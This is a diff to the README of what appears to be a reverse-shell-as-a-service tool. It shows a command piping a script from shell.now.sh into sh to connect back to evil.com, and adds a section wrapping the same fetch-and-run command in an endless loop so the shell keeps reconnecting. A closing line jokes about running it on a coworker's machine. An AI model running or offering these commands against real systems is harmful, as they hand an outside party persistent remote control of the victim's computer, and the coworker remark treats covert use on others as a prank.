@@ -55,6 +55,16 @@ You could listen for connections on a server at evil.com and get a reverse shell
 curl https://shell.now.sh/evil.com:1337 | sh
 ```
 
+### Reconnecting
+
+By default when the shell exits you lose your connection. You may do this by accident with an invalid command. You can easily create a shell that will attempt to reconnect by wrapping it in a while loop.
+
+```shell
+while true; do curl https://shell.now.sh/yourip:1337 | sh; done
+```
+
+Be careful if you do this to a coworker, if they leave the office with this still running you're opening them up to attack.
+
 ## License
 
 MIT © Luke Childs
